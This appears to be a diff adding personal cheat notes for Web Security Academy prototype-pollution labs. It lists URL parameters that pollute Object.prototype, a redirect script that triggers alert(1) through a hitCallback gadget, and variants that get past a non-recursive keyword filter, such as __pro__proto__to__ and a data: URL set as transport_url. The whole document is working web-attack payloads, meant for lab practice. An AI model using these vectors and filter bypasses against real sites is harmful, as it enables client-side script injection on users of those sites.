@@ -1,0 +1,17 @@
+CSRF:
+<script>
+    location="https://YOUR-LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert(1)
+</script>
+
+
+Vectors:
+/?__proto__[foo]=bar
+/?__proto__.foo=bar
+/?constructor.prototype.foo=bar
+
+App strips but not recursively:
+/?__pro__proto__to__[foo]=bar
+/?__pro__proto__to__.foo=bar
+/?constconstructorructor.[protoprototypetype][foo]=bar
+/?constconstructorructor.protoprototypetype.foo=bar
+/?__pro__proto__to__[transport_url]=data:,alert(1);
